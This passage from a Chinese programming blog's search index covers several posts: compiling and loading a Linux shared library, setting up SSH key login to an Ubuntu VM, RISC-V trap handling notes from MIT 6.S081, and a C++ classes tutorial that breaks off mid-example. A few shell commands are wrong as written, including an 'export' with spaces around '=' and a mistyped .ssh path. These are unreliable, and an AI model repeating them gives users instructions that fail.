制作如图所示我们有如下文件，我们按如下命令依次编译，并生成动态库文件，将库文件复制到lib文件夹内。 1gcc -c -fpic add.c div.c mult.c sub.c 1gcc -shared *.o -o libcalc.so 将libcalc.so文件复制到lib文件夹中，我们有如下文件： 动态库的使用我们编译main.c文件 1gcc main.c -o main -I include/ -L lib/ -l calc 运行main文件 1./main 报错，报错信息如下： 库工作原理静态库：GCC进行连接时，会把静态库中代码打包到可执行程序中 动态库：GCC进行连接时，动态库的代码不会被打包到可执行程序中 程序启动之后，动态库会被动态加载到内存中，通过ldd（list dynamic dependencies）命令检查动态库依赖关系 当系统加载可执行代码时，能够知道其所依赖的库的名字，但是还需要知道绝对路径。此时就需要系统的动态载入器来获取该绝对路径。对于elf格式的可执行程序，是由ld-linux.so来完成的，它先后搜索elf文件的DT_RPATH段-&gt;环境变量LD _LIBARAY_PATH-&gt;&#x2F;etc&#x2F;ld.so.cache文件列表-&gt;&#x2F;lib&#x2F;,&#x2F;usr&#x2F;lib目录找到库文件后将其载入内存。 动态库加载失败的原因和解决方法我们运行命令 1ldd main 发现我们自己写的libcalc.so动态库找不到 添加环境变量，输入命令： 1export LD_LIBRARY_PATH = $LD_LIBRARY_PATH:/home/plucky/Linux/lecture05/library/lib 我们再运行命令： 1ldd main 我们手动设置了动态库的路径，但是这只是临时的，关闭之后再次打开就会失效 我们进入到&#x2F;home目录下运行命令 1vim .bashrc 修改.bashrc文件，在最后一行插入 1LD_LIBRARY_PATH = $LD_LIBRARY_PATH:/home/plucky/Linux/lecture05/library/lib 保存之后退出，运行 1source .bashrc 只要手动设置了动态库的路径，就可以运行.&#x2F;main 还可以通过修改&#x2F;etc&#x2F;ld.so.cache文件，将动态库文件放入&#x2F;lib&#x2F;，&#x2F;usr&#x2F;lib&#x2F; 静态库和动态库的对比静态库的优缺点优点 静态库被打包到应用程序中，加载速度快 发布程序无须提供静态库，移植方便 缺点 浪费系统资源，浪费内存 更新、部署、发布麻烦 动态库的优缺点优点 可以实现进程间资源共享（共享库） 更新、部署、发布简单 可以控制何时加载动态库 缺点 加载速度比静态库慢 发布程序时需要依赖的动态库","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"C++ 学习 Linux系统编程 开发环境搭建","slug":"C++-学习-Linux系统编程-开发环境搭建","date":"2023-04-20T08:02:55.000Z","updated":"2023-11-28T09:00:19.348Z","comments":true,"path":"2023/04/20/C++-学习-Linux系统编程-开发环境搭建/","link":"","permalink":"http://example.com/2023/04/20/C++-%E5%AD%A6%E4%B9%A0-Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"安装相关工具 Windows 虚拟机 | Workstation Pro | VMware | CN Visual Studio Code Xshell和Xftp 清华大学Ubuntu镜像 配置过程","text":"安装相关工具 Windows 虚拟机 | Workstation Pro | VMware | CN Visual Studio Code Xshell和Xftp 清华大学Ubuntu镜像 配置过程首先打开ubuntu，安装ssh服务端，输入指令 1sudo apt install openssh-server 之后打开Xshell 点击新建，如下图: 在名称处填写连接的名称，在主机处填写Ubuntu的ip地址打开Ubuntu，输入命令 1ifconfig 得到ip地址为192.168.194.129 之后我们使用Xshell连接，此时会让我们填写用户名和密码，我们填写Ubuntu的用户名和它的密码即可 然后我们打开VScode，安装拓展 之后会发现vscode多出一个远程资源管理器，我们点击远程资源管理器，然后打开SSH，配置文件，C:\\Users\\zc\\ssh\\config 1234# Read more about SSH config files: https://linux.die.net/man/5/ssh_configHost Ubuntu-plucky 填写主机名，随便起 HostName 192.168.194.129 Ubuntu的IP地址 User plucky Ubuntu的用户名 之后就可以连接主机和打开文件夹 配置SSH公私钥免密登录首先在windows主机输入命令 1ssh-keygen -t rsa 随后所有设置都按回车 我们可以看到用户目录下 id_rsa为私钥，id_rsa.pub为公钥 之后我们打开Ubuntu，输入命令 1ssh-keygen -t rsa 随后所有设置都按回车 之后 1cd /.ssh 1vim authorized_keys 将windows中的id_rsa.pub复制进authorized_keys中。 之后就可以实现无密登录了 禁用密码登录1sudo vim /etc/ssh/sshd_config 修改 1PasswordAuthentication no 保存文件并重新启动 SSH 服务 1sudo systemctl restart sshd","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"Linux系统编程","slug":"编程语言/C/Linux系统编程","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"MIT6 S081 Operating System Engineering Lecture06 Isolation and system call entry/exit","slug":"MIT6-S081-Operating-System-Engineering-Lecture06-Isolation-and-system-call-entry-exit","date":"2023-04-20T06:13:04.000Z","updated":"2023-04-20T06:47:00.073Z","comments":true,"path":"2023/04/20/MIT6-S081-Operating-System-Engineering-Lecture06-Isolation-and-system-call-entry-exit/","link":"","permalink":"http://example.com/2023/04/20/MIT6-S081-Operating-System-Engineering-Lecture06-Isolation-and-system-call-entry-exit/","excerpt":"Trap机制程序完成用户空间和内核空间切换的时机 程序执行系统调用 程序出现了类似page fault，运算时除以0的错误 一个设备触发了中断使得当前程序运行需要相应内核设备驱动","text":"Trap机制程序完成用户空间和内核空间切换的时机 程序执行系统调用 程序出现了类似page fault，运算时除以0的错误 一个设备触发了中断使得当前程序运行需要相应内核设备驱动 Trap用户空间和内核空间的切换通常被称为trap trap涉及了许多小心的设计和重要的细节，这些细节对于实现安全隔离和性能来说非常重要。因为很多应用程序，要么因为系统调用，要么因为page fault，都会频繁的切换到内核中。所以，trap机制要尽可能的简单，这一点非常重要。 我们有一些用户应用程序，例如Shell，它运行在用户空间，同时我们还有内核空间。Shell可能会执行系统调用，将程序运行切换到内核。比如XV6启动之后Shell输出的一些提示信息，就是通过执行write系统调用来输出的。 寄存器我们需要清楚如何让程序的运行，从只拥有user权限并且位于用户空间的Shell，切换到拥有supervisor权限的内核。在这个过程中，硬件的状态将会非常重要，因为我们很多的工作都是将硬件从适合运行用户应用程序的状态，改变到适合运行内核代码的状态。 每个 RISC-V CPU都有一组控制寄存器，内核会写入这些寄存器以告诉 CPU 如何处理trap，并且内核可以读取这些寄存器以了解发生的陷阱。RISC-V 文档包含完整的信息。riscv.h（kernel&#x2F;riscv.h:1）包含 xv6 使用的定义。以下是最重要的几个寄存器概述： Program Counter Register:程序计数器 表明当前mode的标志位：这个标志位表明了当前是supervisor mode还是user mode。当我们在运行shell的时候，自然是在user mode。 SATP（Supervisor Address Translation and Protection）：包含了指向page table的物理地址 STVEC（Supervisor Trap Vector Base Address Register）：指向内核中处理trap指令的起始地址 SEPC（Supervisor Exception Program Counter），在trap的过程中保存程序计数器的值 SSRATCH（Supervisor Scratch Register）内核在此处放置一个值，在处理程序开始时非常方便 trap处理过程中的一些操作在trap的最开始，CPU的所有状态都设置成运行用户代码而不是内核代码。在trap处理的过程中，我们实际上需要更改一些这里的状态，或者对状态做一些操作。这样我们才可以运行系统内核中普通的C程序。接下来我们先来预览一下需要做的操作： 首先，我们需要保存32个用户寄存器。因为很显然我们需要恢复用户应用程序的执行，尤其是当用户程序随机的被设备中断所打断时。我们希望内核能够响应中断，之后在用户程序完全无感知的情况下再恢复用户代码的执行。所以这意味着32个用户寄存器不能被内核弄乱。但是这些寄存器又要被内核代码所使用，所以在trap之前，你必须先在某处保存这32个用户寄存器。 PC(程序计数器)也需要在某个地方保存，我们需要能够在用户程序运行中断的位置继续执行用户程序 我们需要将mode改为supervisor mode，因为我们想要使用内核中各种各样的指令 SATP寄存器现在正指向user page table，而user page table只包含了用户程序所需要的内存映射和一两个其他的映射，它并没有包含整个内核数据的内存映射，所以在运行内核代码之前，我们需要将SATP指向kernel page table。 我们需要将堆栈寄存器指向位于内核的一个地址，因此我们需要一个堆栈来调用内核的C函数 一旦我们都设置好了，并且所有的硬件状态都适合在内核中使用，我们需要跳入内核的C代码","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"MIT6.S081 Operating System Engineering","slug":"课程学习/MIT6-S081-Operating-System-Engineering","permalink":"http://example.com/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/MIT6-S081-Operating-System-Engineering/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"C++学习 类与对象","slug":"C++-学习-类与对象","date":"2023-04-16T12:31:16.000Z","updated":"2023-05-09T08:11:27.363Z","comments":true,"path":"2023/04/16/C++-学习-类与对象/","link":"","permalink":"http://example.com/2023/04/16/C++-%E5%AD%A6%E4%B9%A0-%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/","excerpt":"C++面向对象三大特性：封装、继承、多态 C++认为万事万物都皆为对象，对象上有其属性和行为 例如：","text":"C++面向对象三大特性：封装、继承、多态 C++认为万事万物都皆为对象，对象上有其属性和行为 例如： 人可以作为对象，属性有姓名、年龄、身高、体重…..，行为有走、跑、跳…… 具有相同性质的对象，我们可以抽象称为类，人属于人类，车属于车类 封装封装的意义封装是C++面向对象三大特性之一 封装的意义： 将属性和行为作为一个整体，表现生活中的事物 将属性和行为加以权限控制 封装的意义一在设计类的时候，属性和行为写在一起，表现事物 语法：class 类名 &#123; 访问权限 : 属性 / 行为 &#125;; 示例一： 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;const double PI = 3.14;//设计一个圆类，求圆的周长//圆求周长的公式：2*PI*半径//class代表设计一个类，类后面紧跟着的就是类名称class Circle&#123; //访问权限 //公共权限public: //属性 //半径 int m_r; //行为 //获取圆的周长 double calculateZC() &#123; return 2 * PI * m_r; &#125;&#125;;int main()&#123; //通过圆类 创建具体的圆 （对象） Circle c1; //给圆对象的属性进行赋值 c1.m_r = 10; cout &lt;&lt; &quot;圆的周长为：&quot; &lt;&lt; c1.calculateZC() &lt;&lt; endl;&#125; 运行结果为： 圆的周长为：62.8 示例二： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;const double PI = 3.14;//设计一个学生类，属性具有姓名和学号//可以给姓名和学号赋值，可以显示学生的姓名和学号//设计学生类class Student&#123; //访问权限 //公共权限public: //属性 //姓名和学号 string m_Name;//姓名 int m_id;//学号 //行为 //显示姓名和学号 void showStudent() &#123; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; m_Name &lt;&lt; &quot; 学号：&quot; &lt;&lt; m_id &lt;&lt; endl; &#125; //给姓名赋值 void setName(string name) &#123; m_Name = name; &#125; void setId(int id) &#123; m_id = id; &#125;&#125;;int main()&#123; //创建一个具体学生 实例化对象 Student s1; Student s2; //给S1对象 进行属性复制操作 s1.setName(&quot;张三&quot;); s1.setId(1); s2.m_Name = &quot;李四&quot;; s2.m_id = 2; s1.showStudent(); s2.showStudent();&#125; 运行结果为： 姓名： 张三 学号：1姓名： 李四 学号：2 封装的意义二类在设计时，可以把属性和行为放在不同的权限下，加以控制 访问权限有三种： public 公共权限 protected 保护权限 private 私有权限 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//访问权限//三种//公共权限 public 成员 类内可以访问 类外可以访问 //保护权限 protected 成员 类内可以访问 类外不可以访问 儿子也可以访问父亲中的保护内容//私有权限 private 成员 类内可以访问 类外不可以访问 儿子不可以访问父亲中的私有内容class Person&#123; //公共权限public: string m_Name;//姓名protected: //保护权限 string m_Car;//汽车private: //私有权限 int m_Password;//银行卡密码public: void func() &#123; m_Name = &quot;张三&quot;; m_Car = &quot;拖拉机&quot;; m_Password = 123456; &#125;&#125;;int main()&#123; //实例化具体对象 Person p1; p1.m_Name = &quot;李四&quot;; p1.m_Car = &quot;奔驰&quot;; p1.m_Password = 654321;&#125; struct和class的区别在C++中struct和class唯一的区别就在于默认的访问权限不同 区别： struct权限默认为公共 class权限默认为私有 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class C1&#123; int m_A;&#125;;struct C2&#123; int m_A;&#125;;int main()&#123; C1 c1; c1.m_A = 100; C2 c2; c2.m_A = 100;&#125; 成员属性设置为私有优点1：将所有成员属性设置为私有，可以自己控制读写权限 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//成员属性设置为私有//1、可以自己控制读写权限//2、对于写可以检测数据的有效性//设计人类class Person&#123;public: //设置姓名 void setName(string name) &#123; m_Name = name; &#125; //获取姓名 string getName() &#123; return m_Name; &#125; //获取年龄 只读 int getAge() &#123; m_Age = 0; return m_Age; &#125; //设置情人 只写 void setLover(string lover) &#123; m_Lover = lover; &#125;private: //姓名 可读可写 string m_Name; //年龄 只读 int m_Age; //情人 只写 string m_Lover;&#125;;int main() &#123; Person p; p.setName(&quot;张三&quot;); cout &lt;&lt; &quot;姓名为： &quot; &lt;&lt; p.getName() &lt;&lt; endl; cout &lt;&lt; &quot;年龄为：&quot; &lt;&lt; p.getAge() &lt;&lt; endl; p.setLover(&quot;李四&quot;); //无法访问&#125; 运行结果为： 姓名为： 张三年龄为：0 优点2：对于写权限，我们可以检测数据的有效性 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//成员属性设置为私有//1、可以自己控制读写权限//2、对于写可以检测数据的有效性//设计人类class Person&#123;public: //设置姓名 void setName(string name) &#123; m_Name = name; &#125; //获取姓名 string getName() &#123; return m_Name; &#125; //获取年龄 可读可写 如果想修改（年龄的范围必须是0~150之间） int getAge() &#123; return m_Age; &#125; //设置名字 void setAge(int age) &#123; if (age &lt; 0 || age &gt;150) &#123; cout &lt;&lt; &quot;年龄错误&quot; &lt;&lt; endl; return; &#125; m_Age = age; &#125; //设置情人 只写 void setLover(string lover) &#123; m_Lover = lover; &#125;private: //姓名 可读可写 string m_Name; //年龄 只读 int m_Age; //情人 只写 string m_Lover;&#125;;int main() &#123; Person p; p.setName(&quot;张三&quot;); cout &lt;&lt; &quot;姓名为： &quot; &lt;&lt; p.getName() &lt;&lt; endl; p.setAge(1000); cout &lt;&lt; &quot;年龄为：&quot; &lt;&lt; p.getAge() &lt;&lt; endl; p.setLover(&quot;李四&quot;); //无法访问&#125; 运行结果为： 姓名为： 张三年龄错误年龄为：-858993460 练习案例一设计立方体类（Cube） 求出立方体的面积和体积 分别用全局函数和成员函数判断两个立方体是否相等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//立方体类设计//1、创建立方体类//2、创建属性//3、设计行为 获取立方体面积和体积//4、分别利用全局函数和成员函数 判断两个立方体是否相等class Cube&#123;public: //行为 //设置获取长宽高 // 设置长 void setL(int l) &#123; m_L = l; &#125; // 获取长 int getL() &#123; return m_L; &#125; // 设置宽 void setW(int w) &#123; m_W = w; &#125; // 获取宽 int getW() &#123; return m_W; &#125; // 设置高 void setH(int H) &#123; m_H = H; &#125; // 获取高 int getH() &#123; return m_H; &#125; // 获取立方体面积 int calculateS() &#123; return 2 * m_L * m_W + 2 * m_L * m_H + 2 * m_W * m_H; &#125; // 获取立方体体积 int calculateV() &#123; return m_L * m_H * m_W; &#125; //利用成员函数判断两个立方体是否相等 bool isSameByClass(Cube&amp; c) &#123; if (getL() == c.getL() &amp;&amp; getW() == c.getW() &amp;&amp; getH() == c.getH()) &#123; return true; &#125; else &#123; return false; &#125; &#125; //属性private: int m_L;//长 int m_W;//宽 int m_H;//高&#125;;//利用全局函数判断 两个立方体是否相等bool isSame(Cube&amp; c1, Cube&amp; c2)&#123; if (c1.getL() == c2.getL() &amp;&amp; c1.getW() == c2.getW() &amp;&amp; c1.getH() == c2.getH()) return true; return false;&#125;int main()&#123; //创建立方体对象 Cube c1; c1.setL(10); c1.setW(10); c1.setH(10); cout &lt;&lt; &quot;c1的面积为：&quot; &lt;&lt; c1.calculateS() &lt;&lt; endl; cout &lt;&lt; &quot;c1的体积为：&quot; &lt;&lt; c1.calculateV() &lt;&lt; endl; //创建第二个立方体对象 Cube c2; c2.setL(10); c2.setW(10); c2.setH(10); cout &lt;&lt; &quot;c2的面积为：&quot; &lt;&lt; c2.calculateS() &lt;&lt; endl; cout &lt;&lt; &quot;c2的体积为：&quot; &lt;&lt; c2.calculateV() &lt;&lt; endl; //利用全局函数判断 bool ret = isSame(c1, c2); if (ret) &#123; cout &lt;&lt; &quot;c1和c2是相等的&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;c1和c2是不相等的&quot; &lt;&lt; endl; &#125; //利用成原函数判断 ret = c1.isSameByClass(c2); if (ret) &#123; cout &lt;&lt; &quot;c1和c2是相等的&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;c1和c2是不相等的&quot; &lt;&lt; endl; &#125;&#125; 运行结果为： c1的面积为：600c1的体积为：1000c2的面积为：600c2的体积为：1000c1和c2是相等的c1和c2是相等的 练习案例二设计一个圆形类（Circle），和一个点类（Point），计算点和圆的关系 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//点与圆的关系案例// 点类class Point &#123;public: //设置x void setX(int x) &#123; m_X = x; &#125; //获取x int getX() &#123; return m_X; &#125; //设置y void setY(int y) &#123; m_Y = y; &#125; //获取y int getY() &#123; return m_Y; &#125;private: int m_X; int m_Y;&#125;;//圆类class Circle&#123;public: //设置半径 void setR(int r) &#123; m_R = r; &#125; //获取半径 int getR() &#123; return m_R; &#125; //设置圆心 void setCenter(Point center) &#123; m_Center = center; &#125; Point getCenter() &#123; return m_Center; &#125;private: int m_R;//半径 Point m_Center;//圆心&#125;;//判断点和圆的关系void isInCircle(Circle&amp; c, Point&amp; p) &#123; //计算两点之间距离的平方 int distance = (c.getCenter().getX() - p.getX()) * (c.getCenter().getX() - p.getX()) + (c.getCenter().getY() - p.getY()) * (c.getCenter().getY() - p.getY()); //计算半径的平方 int rDistance = c.getR() * c.getR(); //判断关系 if (distance == rDistance) &#123; cout &lt;&lt; &quot;点在圆上&quot; &lt;&lt; endl; &#125; else if (distance &gt; rDistance) &#123; cout &lt;&lt; &quot;点在圆外&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;点在圆内&quot; &lt;&lt; endl; &#125;&#125;int main()&#123; //创建圆 Circle c; c.setR(10); Point center; center.setX(10); center.setY(0); c.setCenter(center); //创建点 Point p; p.setX(10); p.setY(10); //判断关系 isInCircle(c, p);&#125; 运行结果为： 点在圆上 对象的初始化和清理 生活中我们买的电子产品基本都会有出厂设置，在某一天我们不用的时候也会删除一些自己的信息数据保证安全 C++中的面向对象来自于生活，每个对象也都会有初始设置以及对象销毁前的清理数据的设置 构造函数和析构函数对象的初始化和清理也是两个非常重要的安全问题 一个对象或者变量没有初始状态，对其使用后果是未知 同样的使用完一个对象或变量，没有及时清理，也会造成一定的问题 C++利用了构造函数和析构函数解决上述问题，这两个函数将会被编译器自动调用，完成对象初始化和清理工作。 对象的初始化和清理工作是编译器强制要我们做的事情，因此如果我们不提供构造和析构，编译器会提供编译器提供的构造函数和析构函数是空实现 构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。 析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作 构造函数语法：类名（）&#123;&#125; 1、构造函数：没有返回值也不写void 2、函数名称与类名相同 3、构造函数可以有参数，因此可以发生重载 4、程序在调用对象时会自动调用构造，无须手动调用，而且只会调用一次 析构函数语法：~类名（）&#123;&#125; 1、析构函数：没有返回值也不写void 2、函数名称与类名相同，在名称前加上符号~ 3、析构函数不可以有参数，因此不可以发生重载 4、程序在对象销毁前会自动调用析构，无须手动调用，而且只会调用一次 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//对象的初始化和清理class Person&#123; //1 构造函数 //没有返回值 不用写void //函数名与类名相同 //构造函数可以有参数可以发生重载 //创建对象的时候，构造函数会自动调用，而且只调用一次public: Person() &#123; cout &lt;&lt; &quot;Person构造函数的调用&quot; &lt;&lt; endl; &#125; //2 析构函数 //没有返回值 不写void //函数名和类名相同 在名称前加~ //析构函数不可以有参数，不可以发生重载 //对象在销毁前，会自动调用析构函数 ~Person() &#123; cout &lt;&lt; &quot;Person析构函数的调用&quot; &lt;&lt; endl; &#125;&#125;;//构造和析构都是必须有的实现，如果我们自己不提供，编译器会提供一个空实现的构造和析构void test01()&#123; Person p;//在栈上的数据，test01执行完毕之后，释放这个对象&#125;int main()&#123; test01();&#125; 运行结果为： Person构造函数的调用Person析构函数的调用 构造函数的分类及调用两种分类方式： 按参数分为：有参数构造和无参数构造 按类型分为：普通构造和拷贝构造 三种调用方式： 括号法 显式法 隐式转换法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//分类class Person&#123;public: //构造函数 Person() &#123; cout &lt;&lt; &quot;Person的无参构造函数调用&quot; &lt;&lt; endl; &#125; Person(int a) &#123; age = a; cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; &#125; //拷贝构造函数 Person(const Person&amp; p) &#123; //将传入的人的身上的所有属性，拷贝到我身上 age = p.age; cout &lt;&lt; &quot;Person的拷贝函数调用&quot; &lt;&lt; endl; &#125; ~Person() &#123; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; int age;&#125;;//调用void test01()&#123; //1、括号法 Person p1 ;//默认构造函数的调用 Person p2(10);//有参构造函数 //拷贝构造函数调用 Person p3(p2); //注意事项 //调用默认构造函数的时候，不要加（） cout &lt;&lt; &quot;p2的年龄为：&quot; &lt;&lt; p2.age &lt;&lt; endl; cout &lt;&lt; &quot;p3的年龄为：&quot; &lt;&lt; p3.age &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： Person的无参构造函数调用Person的有参构造函数调用Person的拷贝函数调用p2的年龄为：10p3的年龄为：10Person的析构函数调用Person的析构函数调用Person的析构函数调用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//分类class Person&#123;public: //构造函数 Person() &#123; cout &lt;&lt; &quot;Person的无参构造函数调用&quot; &lt;&lt; endl; &#125; Person(int a) &#123; age = a; cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; &#125; //拷贝构造函数 Person(const Person&amp; p) &#123; //将传入的人的身上的所有属性，拷贝到我身上 age = p.age; cout &lt;&lt; &quot;Person的拷贝函数调用&quot; &lt;&lt; endl; &#125; ~Person() &#123; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; int age;&#125;;//调用void test01()&#123; //2、显示法 Person p1; Person p2 = Person(10);//有参构造 Person p3 = Person(p2);//拷贝构造 Person(10);//匿名对象 特点：当前行执行结束后，系统会立即回收掉匿名对象//注意事项：不要利用拷贝构造函数 初始化匿名对象 编译器会认为是对象声明&#125;int main()&#123; test01();&#125; 运行结果为： Person的无参构造函数调用Person的有参构造函数调用Person的拷贝函数调用Person的有参构造函数调用Person的析构函数调用Person的析构函数调用Person的析构函数调用Person的析构函数调用 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//分类class Person&#123;public: //构造函数 Person() &#123; cout &lt;&lt; &quot;Person的无参构造函数调用&quot; &lt;&lt; endl; &#125; Person(int a) &#123; age = a; cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; &#125; //拷贝构造函数 Person(const Person&amp; p) &#123; //将传入的人的身上的所有属性，拷贝到我身上 age = p.age; cout &lt;&lt; &quot;Person的拷贝函数调用&quot; &lt;&lt; endl; &#125; ~Person() &#123; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; int age;&#125;;//调用void test01()&#123; //3、隐式转换法 Person p4 = 10; Person p5 = p4;&#125;int main()&#123; test01();&#125; 运行结果为： Person的有参构造函数调用Person的拷贝函数调用Person的析构函数调用Person的析构函数调用 拷贝构造函数的调用时机C++中拷贝构造函数调用时机通常有三种情况 使用一个以及创建完毕的对象来初始化一个新对象 值传递的方式给函数参数传值 以值方式返回局部对象 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//拷贝构造函数调用时机//1、使用一个已经创建完毕的对象来初始化一个对象//2、值传递的方式给函数参数传值//3、值方式返回局部对象class Person&#123;public: Person() &#123; cout &lt;&lt; &quot;Person默认构造函数调用&quot; &lt;&lt; endl; &#125; Person(int age) &#123; cout &lt;&lt; &quot;Person有参构造函数调用&quot; &lt;&lt; endl; m_Age = age; &#125; Person(const Person&amp; p) &#123; cout &lt;&lt; &quot;Person拷贝构造函数调用&quot; &lt;&lt; endl; m_Age = p.m_Age; &#125; ~Person() &#123; cout &lt;&lt; &quot;Person析构函数调用&quot; &lt;&lt; endl; &#125; int m_Age;&#125;;//1、使用一个已经创建完毕的对象来初始化一个对象void test01()&#123; Person p1(20); Person p2(p1); cout &lt;&lt; &quot;p2的年龄为：&quot; &lt;&lt; p2.m_Age &lt;&lt; endl;&#125;//2、值传递的方式给函数参数传值void doWork1(Person p)&#123;&#125;void test02()&#123; Person p; doWork1(p);&#125;//3、值方式返回局部对象Person doWork2()&#123; Person p1; return p1;&#125;void test03()&#123; Person p = doWork2();&#125;int main()&#123; cout &lt;&lt; &quot;test01()&quot; &lt;&lt; endl; test01(); cout &lt;&lt; &quot;test02()&quot; &lt;&lt; endl; test02(); cout &lt;&lt; &quot;test03()&quot; &lt;&lt; endl; test03();&#125; 运行结果如下： test01()Person有参构造函数调用Person拷贝构造函数调用p2的年龄为：20Person析构函数调用Person析构函数调用test02()Person默认构造函数调用Person拷贝构造函数调用Person析构函数调用Person析构函数调用test03()Person默认构造函数调用Person拷贝构造函数调用Person析构函数调用Person析构函数调用 构造函数的调用规则 默认情况下，C++编译器至少给一个类添加3个函数 1、默认构造函数（无参，函数体为空） 2、默认析构函数（无参，函数体为空） 3、默认拷贝函数，对属性进行值拷贝 构造函数调用规则如下： 如果用户定义有参构造函数，C++不在提供默认无参构造，但会提供默认拷贝构造 如果用户定义拷贝构造函数，C++不会在提供其他构造函数 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//构造函数调用规则//1、创建一个类，C++编译器会给每个类都添加至少3个函数//默认构造（空实现）//析构函数（空实现）//拷贝构造（值拷贝）class Person&#123;public: Person() &#123; cout &lt;&lt; &quot;Person的默认构造函数调用&quot; &lt;&lt; endl; &#125; Person(int age) &#123; cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; &#125; /*Person(const Person&amp; p) &#123; cout &lt;&lt; &quot;Person的拷贝构造函数调用&quot; &lt;&lt; endl; m_Age = p.m_Age; &#125;*/ ~Person() &#123; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; int m_Age;&#125;;void test01()&#123; Person p; p.m_Age = 18; Person p2(p); cout &lt;&lt; &quot;p2的年龄为：&quot; &lt;&lt; p2.m_Age &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果如下： Person的默认构造函数调用p2的年龄为：18Person的析构函数调用Person的析构函数调用 深拷贝与浅拷贝浅拷贝：简单的赋值拷贝操作 深拷贝：在堆区重新申请空间，进行拷贝操作 如果利用编译器提供的拷贝构造函数，会做浅拷贝操作 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//深拷贝与浅拷贝class Person&#123;public: Person() &#123; cout &lt;&lt; &quot;Person的默认构造函数调用&quot; &lt;&lt; endl; &#125; Person(int age, int height) &#123; m_Age = age; m_Height = new int(height); cout &lt;&lt; &quot;Person的有参构造函数调用&quot; &lt;&lt; endl; &#125; ~Person() &#123; //析构代码，将堆区开辟的数据做释放操作 if (m_Height != NULL) &#123; delete m_Height; m_Height = NULL; &#125; cout &lt;&lt; &quot;Person的析构函数调用&quot; &lt;&lt; endl; &#125; int m_Age; int* m_Height;&#125;;void test01()&#123; Person p1(18 , 160); cout &lt;&lt; &quot;p1的年龄为：&quot; &lt;&lt; p1.m_Age &lt;&lt; &quot; 